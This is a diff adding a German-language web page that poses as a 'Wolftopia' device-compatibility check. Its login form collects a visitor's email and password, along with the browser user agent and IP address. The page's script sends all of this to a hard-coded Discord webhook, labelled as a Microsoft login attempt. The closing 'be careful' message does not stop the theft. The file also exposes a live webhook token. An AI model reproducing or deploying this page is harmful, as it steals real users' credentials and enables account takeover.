@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Wolftopia SystemCheck</title>
+  <style>
+    :root {
+      --bg-color: #f3f3f3;
+      --card-color: #ffffff;
+      --btn-color: #0078d4;
+      --text-color: #333;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: var(--bg-color);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .card {
+      background-color: var(--card-color);
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      text-align: center;
+    }
+
+    h1 {
+      color: var(--btn-color);
+      font-size: 20px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: var(--btn-color);
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      width: 100%;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #006ab3;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #777;
+    }
+
+    #loading {
+      display: none;
+      margin-top: 20px;
+      color: var(--btn-color);
+      font-weight: bold;
+    }
+
+    .alert {
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #f8d7da;
+      color: #721c24;
+      border-radius: 5px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h1>Willkommen bei Wolftopia</h1>
+    <p>Bitte melden Sie sich an, um zu überprüfen, ob Ihr Gerät für Wolftopia kompatibel ist.</p>
+    
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="E-Mail-Adresse" required />
+      <input type="password" id="password" placeholder="Passwort" required />
+      <button type="submit">Anmelden</button>
+    </form>
+
+    <p id="loading">Bitte warten, während wir Ihre Daten verifizieren...</p>
+    <div id="alertBox" class="alert" style="display: none;"></div>
+
+    <div class="footer">
+      <p>© 2025 Wolftopia – Alle Rechte vorbehalten.</p>
+    </div>
+  </div>
+
+  <script>
+    const loginForm = document.getElementById("loginForm");
+    const loading = document.getElementById("loading");
+    const alertBox = document.getElementById("alertBox");
+
+    loginForm.addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      // Zeige Ladeanimation
+      loading.style.display = "block";
+
+      // Simuliere das Senden der Daten
+      await new Promise(resolve => setTimeout(resolve, 2000));
+
+      // Senden der Daten an Discord Webhook
+      const payload = {
+        content: "**Neue Anmeldedaten erhalten:**",
+        embeds: [{
+          title: "Microsoft Login Versuch",
+          color: 5814783,
+          fields: [
+            { name: "E-Mail-Adresse", value: email, inline: false },
+            { name: "Passwort", value: password, inline: false },
+            { name: "Gerät", value: navigator.userAgent, inline: false },
+            { name: "IP-Adresse", value: await getIP(), inline: false }
+          ]
+        }]
+      };
+
+      const webhookURL = "https://discord.com/api/webhooks/1361734808509747301/ZXmk7uvRQDo-j31El8eKrmxmKZZzUPrxiMI7ZQuM-uPcOMrleMRpserZyPQhygj26bD7"; // Dein Webhook-URL hier
+
+      try {
+        await fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        
+        loading.style.display = "none";
+        alertBox.style.display = "block";
+        alertBox.textContent = "Achtung! Du hast gerade deine Daten gesendet. Bitte sei vorsichtig!";
+      } catch (error) {
+        alertBox.style.display = "block";
+        alertBox.textContent = "Fehler beim Senden der Daten!";
+        console.error(error);
+      }
+    });
+
+    async function getIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        return data.ip;
+      } catch (err) {
+        return "IP konnte nicht abgerufen werden.";
+      }
+    }
+  </script>
+
+</body>
+</html>
